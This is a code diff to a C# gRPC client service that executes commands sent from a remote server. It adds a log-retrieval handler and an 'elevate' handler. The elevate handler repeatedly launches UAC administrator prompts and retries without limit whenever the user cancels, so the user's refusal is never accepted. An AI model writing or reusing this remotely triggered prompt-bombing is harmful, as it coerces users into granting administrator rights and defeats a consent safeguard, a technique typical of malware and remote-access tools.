@@ -1,3 +1,4 @@
+using System.ComponentModel;
 using System.Diagnostics;
 using System.Net.NetworkInformation;
 using System.Net.Sockets;
@@ -365,6 +366,14 @@ public class GrpcClientService : BackgroundService
                     result.Stdout = "Acknowledged server shutdown";
                     break;
 
+                case "getlogs":
+                    result = GetClientLogs(command);
+                    break;
+
+                case "elevate":
+                    result = await HandleElevationRequestAsync(command);
+                    break;
+
                 default:
                     result.ErrorMessage = $"Unknown command type: {command.CommandType}";
                     _logger.LogWarning("Unknown command type: {CommandType}", command.CommandType);
@@ -583,6 +592,104 @@ public class GrpcClientService : BackgroundService
             request.TransferId, request.IsUpload);
         // TODO: Implement file transfer handling
         return Task.CompletedTask;
+    }
+
+    /// <summary>
+    /// Get client logs from the circular buffer.
+    /// </summary>
+    private CommandResult GetClientLogs(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        try
+        {
+            // Parse optional line count from command text
+            int maxLines = 200; // Default
+            if (!string.IsNullOrWhiteSpace(command.CommandText) &&
+                int.TryParse(command.CommandText.Trim(), out var requestedLines))
+            {
+                maxLines = Math.Min(requestedLines, 500); // Cap at 500
+            }
+
+            var logs = LogBuffer.Instance.GetLogs(maxLines);
+
+            result.Success = true;
+            result.Stdout = string.IsNullOrEmpty(logs)
+                ? "[No logs available]"
+                : logs;
+
+            _logger.LogDebug("Retrieved {Count} log entries", LogBuffer.Instance.Count);
+        }
+        catch (Exception ex)
+        {
+            result.Success = false;
+            result.ErrorMessage = $"Failed to get logs: {ex.Message}";
+        }
+
+        return result;
+    }
+
+    /// <summary>
+    /// Request elevation by launching a new instance with runas verb.
+    /// Shows UAC prompt immediately and retries infinitely if cancelled.
+    /// </summary>
+    private async Task<CommandResult> HandleElevationRequestAsync(Command command)
+    {
+        var result = new CommandResult { CommandId = command.CommandId };
+
+        // Already admin? No-op
+        if (IsRunningAsAdmin())
+        {
+            result.Success = true;
+            result.Stdout = "Already running as administrator";
+            _logger.LogInformation("Elevation requested but already running as admin");
+            return result;
+        }
+
+        _logger.LogInformation("Elevation requested. Starting UAC prompt loop...");
+
+        var attempts = 0;
+        while (true)
+        {
+            attempts++;
+            _logger.LogInformation("Elevation attempt {Attempt}", attempts);
+
+            try
+            {
+                var startInfo = new ProcessStartInfo
+                {
+                    FileName = Environment.ProcessPath,
+                    Verb = "runas",
+                    UseShellExecute = true,
+                    Arguments = "--elevated"
+                };
+
+                Process.Start(startInfo);
+
+                // Success - elevated process started, exit this one
+                _logger.LogInformation("Elevation successful, exiting non-admin instance");
+                result.Success = true;
+                result.Stdout = "Elevation successful, new admin instance started";
+
+                // Give a moment for the elevated instance to start
+                await Task.Delay(1000);
+
+                // Exit the current non-admin process
+                Environment.Exit(0);
+            }
+            catch (Win32Exception ex) when (ex.NativeErrorCode == 1223)
+            {
+                // ERROR_CANCELLED - User clicked Cancel, immediately retry
+                _logger.LogWarning("User cancelled UAC prompt, retrying immediately...");
+            }
+            catch (Exception ex)
+            {
+                _logger.LogError(ex, "Elevation failed");
+                result.Success = false;
+                result.ErrorMessage = $"Elevation failed: {ex.Message}";
+                return result;
+            }
+        }
     }
 
     private void Cleanup()
